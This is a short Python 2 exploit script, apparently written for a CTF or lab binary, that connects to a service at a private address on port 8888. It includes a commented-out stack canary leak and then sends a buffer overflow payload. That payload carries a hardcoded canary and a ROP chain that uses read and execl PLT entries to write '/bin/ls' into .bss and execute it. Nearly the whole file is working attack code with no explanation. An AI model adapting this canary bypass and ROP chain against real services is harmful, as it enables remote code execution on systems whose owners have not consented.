from socket import *
from struct import *
import time

p = lambda x: pack("<L", x)
up = lambda x: unpack("<L", x)[0]

def sendline(str) :
    s.send(str + "\n")

s = socket(AF_INET, SOCK_STREAM)
s.connect(('192.168.228.138', 8888))

bss = 0x804b080
write_plt = 0x80486E0
read_plt = 0x8048620
execl_plt = 0x8048710
pppr = 0x8048b2c
canary = 0xeede2600

cmd = "ls"
file = "/bin/ls" + '\x00'

print "[*]Exploit!"
print s.recv(1024)
time.sleep(3)
print s.recv(1024)

sendline('4')
print s.recv(1024)

#canary leak
'''
payload = ''
payload += 'y' + 'A' * 10
s.send(payload)

data = s.recv(1024)
print data
canary = "\x00" + data.split("AAAAAAAAAA")[1][0:3]
print "canary : " + hex(up(canary))

print "[+]END..."
s.close()
'''

#buffer overflow
payload = ''
payload += 'y' * 10
payload += p(canary) 
payload += 'A' * 12
#"/bin/sh" read
payload += p(read_plt)
payload += p(pppr)
payload += p(0x04) #fd
payload += p(bss)
payload += p(len(file) + 1)
#"ls" read
payload += p(read_plt)
payload += p(pppr)
payload += p(0x04) #fd
payload += p(bss + len(file) + 1)
payload += p(len(cmd))
#execl
payload += p(execl_plt)
payload += p(pppr)
payload += p(bss)
payload += p(bss + len(file) + 1)
payload += p(0x00)

s.send(payload)

s.send(file)
s.send(cmd)
print s.recv(1024)

sendline('6')
s.close()